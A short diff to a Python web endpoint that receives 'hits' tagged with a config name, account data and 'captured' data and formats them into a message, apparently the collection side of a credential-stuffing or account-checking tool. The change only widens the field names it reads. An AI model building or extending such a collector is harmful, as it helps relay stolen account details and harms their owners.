@@ -19,7 +19,7 @@ async def receive_hit(request: Request):
         config_name = data.get("config") or data.get("configName") or data.get("ConfigName") or "Unknown Config"
 
         account_data = data.get("data", "No Data")
-        captured_data = data.get("captured", "No Captured Data")
+        captured_data = data.get("captured") or data.get("capturedData") or data.get("variables") or "No Captured Data"
         
         # تبسيط الرسالة وتجنب أي رموز قد ترفضها صيغة Markdown
         message = (
